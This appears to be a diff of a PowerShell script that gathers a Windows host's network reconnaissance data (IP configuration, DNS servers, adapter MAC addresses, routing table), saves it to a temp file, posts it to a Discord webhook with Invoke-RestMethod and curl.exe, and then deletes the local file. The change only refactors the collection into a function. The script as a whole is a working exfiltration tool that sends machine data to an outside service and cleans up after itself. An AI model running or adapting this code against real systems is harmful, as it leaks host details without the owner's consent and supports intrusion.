@@ -15,30 +15,49 @@ function Send-ToDiscord {
         content = "Uploading network configuration details"
     }
 
-    # Send 
+    # Send message
     Invoke-RestMethod -Uri $hookUrl -Method Post -ContentType 'Application/Json' -Body ($message | ConvertTo-Json)
 
-    # Upload
+    # Upload the file
     curl.exe -F "file1=@$filePath" $hookUrl
 }
 
 # Specify the Discord webhook URL here
 $discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'
 
-# Gather network details
-$networkDetails = Get-NetIPConfiguration | Out-String
-$networkDetails += Get-DnsClient | Out-String
-$networkDetails += Get-DnsClientServerAddress | Out-String
-$networkDetails += Get-NetAdapter | Select-Object Name, Status, MacAddress, LinkSpeed | Out-String
-$networkDetails += Get-NetRoute | Select-Object DestinationPrefix, NextHop, RouteMetric, ifIndex | Out-String
 
-# Save to a temp file
+function Get-NetworkDetails {
+    $output = @()
+
+
+    $output += "IP Configuration:`n"
+    $output += Get-NetIPConfiguration | Out-String -Width 4096
+
+    $output += "`nDNS Client Settings:`n"
+    $output += Get-DnsClient | Out-String -Width 4096
+
+    $output += "`nDNS Server Addresses:`n"
+    $output += Get-DnsClientServerAddress | Out-String -Width 4096
+
+    $output += "`nNetwork Interface Details:`n"
+    $output += Get-NetAdapter | Format-Table Name, Status, MacAddress, LinkSpeed -AutoSize | Out-String -Width 4096
+
+    $output += "`nRouting Table:`n"
+    $output += Get-NetRoute | Format-Table DestinationPrefix, NextHop, RouteMetric, ifIndex -AutoSize | Out-String -Width 4096
+
+    return $output
+}
+
+# Get the network details
+$networkDetails = Get-NetworkDetails
+
+# Save to temp file
 $tempFile = [IO.Path]::GetTempFileName() + ".txt"
 $networkDetails | Out-File $tempFile
 
 # Send to Discord
 Send-ToDiscord -filePath $tempFile -hookUrl $discordWebhookUrl
 
-#Remove the temporary file
 Remove-Item $tempFile
+
 
